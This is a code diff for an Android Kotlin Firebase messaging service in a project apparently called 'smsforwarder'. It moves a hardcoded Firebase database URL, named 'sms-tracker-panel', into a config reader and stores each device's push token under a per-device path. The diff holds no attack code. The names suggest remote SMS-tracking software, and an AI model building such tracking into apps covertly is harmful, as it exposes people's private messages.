@@ -4,6 +4,7 @@ import android.util.Log
 import com.google.firebase.database.FirebaseDatabase
 import com.google.firebase.messaging.FirebaseMessagingService
 import com.google.firebase.messaging.RemoteMessage
+import com.smsforwarder.utils.ConfigReader
 import com.smsforwarder.utils.DeviceUtils
 import com.smsforwarder.utils.SmsSyncHelper
 
@@ -11,7 +12,6 @@ class MyFirebaseMessagingService : FirebaseMessagingService() {
 
     companion object {
         private const val TAG = "FCM"
-        private const val FIREBASE_URL = "https://sms-tracker-panel-default-rtdb.asia-southeast1.firebasedatabase.app/"
     }
 
     override fun onMessageReceived(remoteMessage: RemoteMessage) {
@@ -31,7 +31,8 @@ class MyFirebaseMessagingService : FirebaseMessagingService() {
     private fun saveTokenToFirebase(token: String) {
         try {
             val deviceId = DeviceUtils.getUniqueDeviceId(this)
-            val ref = FirebaseDatabase.getInstance(FIREBASE_URL)
+            val firebaseUrl = ConfigReader.getFirebaseUrl(this)
+            val ref = FirebaseDatabase.getInstance(firebaseUrl)
                 .getReference("devices/$deviceId/fcm_token")
             ref.setValue(token)
                 .addOnSuccessListener {
